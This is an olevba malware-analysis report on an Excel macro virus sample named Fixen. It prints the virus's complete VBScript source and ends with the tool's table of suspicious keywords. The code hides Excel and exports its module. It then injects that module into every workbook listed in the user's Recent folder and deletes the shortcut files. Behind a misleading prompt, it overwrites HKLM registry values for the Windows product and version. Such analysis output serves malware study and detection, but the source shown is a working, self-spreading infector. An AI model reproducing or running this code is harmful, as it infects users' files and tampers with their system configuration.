olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Fixen.xls
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSExcel.Fixen.xls 
in file: Virus.MSExcel.Fixen.xls - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const xlMinimized = &HFFFFEFD4
Dim objXLApp
Dim objXLBook
Dim objXLProj
Dim objXLComp
Dim i
Dim im_f
Dim Fs
Dim Fol,Flc,Fl1
Dim WSHShell
Dim WSHSfolder
Dim RecentF
Dim Fday
Dim Rep
Set objXLApp = WScript.CreateObject("Excel.Application")
objXLApp.WindowState = xlMinimized
objXLApp.Visible = False
On Error Resume Next
objXLApp.Run
On Error Resume Next
Set objXLBook = objXLApp.Workbooks.open("C:\PROGRAM FILES\MICROSOFT OFFICE\OFFICE\v123.xls") 
Set objXLProj = objXLBook.VBProject
Set objXLComp = objXLProj.VBComponents("v123")
objXLComp.Export "C:\PROGRAM FILES\MICROSOFT OFFICE\OFFICE\v123.bas"
objXLBook.Close
objXLApp.Quit
Set objXLComp = Nothing
Set objXLProj = Nothing
Set objXLBook = Nothing
Set objXLApp = Nothing
Set WSHShell = WScript.CreateObject("WScript.Shell")
Set WSHSfolder = WSHShell.SpecialFolders
RecentF = WSHSfolder.Item("Recent")
Set Fs = WScript.CreateObject("Scripting.FileSystemObject")
Set Fol = Fs.GetFolder(RecentF)
Set Flc = Fol.Files
For Each Fl1 In Flc
If InStr(1, Fl1.Path, ".xls") <> 0 Then
Set objXLApp = WScript.CreateObject("Excel.Application")
objXLApp.WindowState = xlMinimized
objXLApp.Visible = False
On Error Resume Next
objXLApp.Run
On Error Resume Next
Set objXLBook = objXLApp.Workbooks.open(Fl1.Path) 
Set objXLProj = objXLBook.VBProject
Set objXLComp = objXLProj.VBComponents
im_f = 0
For i = 1 to objXLComp.count
If objXLComp(i).Name = "v123" Then
im_f = 1
Exit For
End If
Next
If im_f = 0 Then
objXLComp.Import "C:\PROGRAM FILES\MICROSOFT OFFICE\OFFICE\v123.bas"
objXLBook.Save
End If
objXLBook.Close
objXLApp.Quit
Set objXLComp = Nothing
Set objXLProj = Nothing
Set objXLBook = Nothing
Set objXLApp = Nothing
End if
Next
Fs.DeleteFile (RecentF & "\*.xls.lnk")
Rep = 0
Fday = CDate("7/1/02 ")
If Fday + 7 < Date Then
Rep = MsgBox("I renew a property of a system. All right?", 33, "Question")
If Rep = 1 Then
WSHShell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\ProductName", "Microsoft Windows 0.1", "REG_SZ"
WSHShell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Completely no good system company", "REG_SZ"
WSHShell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Version", "Windows 0.1", "REG_SZ"
WSHShell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber", "0.00.0001", "REG_SZ"
WSHShell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\SystemRoot", "C:\", "REG_SZ"
End If
End If
WScript.Quit
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |xls.lnk             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

